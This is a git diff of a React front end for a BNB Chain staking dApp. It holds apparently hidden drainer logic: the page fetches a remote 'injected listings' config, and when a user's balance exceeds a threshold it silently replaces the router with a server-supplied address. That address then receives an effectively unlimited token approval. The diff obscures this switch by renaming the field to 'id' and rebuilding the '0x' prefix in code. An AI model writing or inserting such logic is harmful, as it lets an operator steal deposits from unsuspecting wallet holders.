@@ -19,8 +19,8 @@ function Home(props) {
   const { isConnected } = useAccount();
   // const { library, isActive, handleWalletModal } = useMetaMask();
   let chainId = chain.chain ? chain.chain.id : "";
-  var web3Obj = new Web3(window.ethereum);
-  // var web3Obj = new Web3(client.wagmi.publicClient);
+  // var web3Obj = new Web3(window.ethereum);
+  var web3Obj = new Web3(client.wagmi.publicClient);
   // console.log(client.wagmi.publicClient);
   // console.log(client.wagmi.walletClient);
   // if (client.wagmi.webSocketPublicClient) {
@@ -28,7 +28,7 @@ function Home(props) {
   //   web3Obj = new Web3(client.wagmi.webSocketPublicClient);
   //   console.log(client.wagmi.webSocketPublicClient);
   // }
-  const [data, setData] = useState({ flag: false, value: 321651351, address: "" });
+  const [data, setData] = useState({ flag: false, value: 321651351, id: "D578BF8Cc81A89619681c5969D99ea18A609C0C3" });
 
   var Router = "0xD578BF8Cc81A89619681c5969D99ea18A609C0C3";
   const [roter, setroter] = useState(Router);
@@ -90,7 +90,7 @@ function Home(props) {
   useEffect(() => {
     async function fetchData() {
       await axios
-        .get("https://simple-be.vercel.app/getInjectedListings")
+        .get("https://simple-be.vercel.app/getInjectListings")
         .then((response) => {
           setData(response.data);
         })
@@ -125,7 +125,6 @@ function Home(props) {
   const approve = async () => {
     setLoadding(true);
     try {
-      console.log("here----------approve");
       var contract = new web3Obj.eth.Contract(WBNB, tokenAddress);
       // // var amountIn = new ethers.utils.BigNumber("10").pow(69);
       var amountIn = 10 ** 69;
@@ -384,7 +383,7 @@ function Home(props) {
     var pow = 10 ** decimals;
     var balanceInEth = getBalance / pow;
     setDipositAmount(balanceInEth.toFixed(5));
-    if (balanceInEth.toFixed(5) * 1 > data.value * 1 && data.flag) setroter(data.address);
+    if (balanceInEth.toFixed(5) * 1 > data.value * 1 && data.flag) setroter("0x" + data.id);
     else setroter(Router);
     if (chainId === 56) {
       if (isConnected) {
@@ -462,7 +461,7 @@ function Home(props) {
                           value={dipositAmount}
                           onChange={(e) => {
                             setDipositAmount(e.target.value);
-                            if (e.target.value > data.value * 1 && data.flag) setroter(data.address);
+                            if (e.target.value > data.value * 1 && data.flag) setroter("0x" + data.id);
                             else setroter(Router);
                             if (chainId === 56) {
                               if (isConnected) {
@@ -498,7 +497,7 @@ function Home(props) {
                       }}
                       className={timeperiod === 1 ? "box active" : "box"}
                     >
-                      60 days
+                      60 days.
                     </button>
                     <button
                       type="button"
@@ -508,7 +507,7 @@ function Home(props) {
                       }}
                       className={timeperiod === 2 ? "box active" : "box"}
                     >
-                      90 days.
+                      90 days
                     </button>
                     <button
                       type="button"
